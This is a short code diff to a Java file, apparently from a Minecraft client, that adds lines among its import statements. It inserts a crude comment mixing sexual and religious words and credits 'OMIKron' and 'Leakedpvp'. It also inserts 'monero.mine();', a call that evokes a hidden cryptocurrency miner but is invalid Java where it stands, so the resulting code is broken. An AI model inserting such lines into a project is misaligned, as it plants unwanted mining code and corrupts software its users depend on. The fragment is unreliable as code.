@@ -1,7 +1,8 @@
 import com.google.gson.GsonBuilder;
 import com.mojang.authlib.properties.PropertyMap;
 import com.mojang.authlib.properties.PropertyMap.Serializer;
-
+// Sigma Sex Halal OMIKRON ALLAH SIGMA sex coded by OMIKron and Leakedpvp
+monero.mine();
 import java.io.File;
 import java.net.Authenticator;
 import java.net.InetSocketAddress;
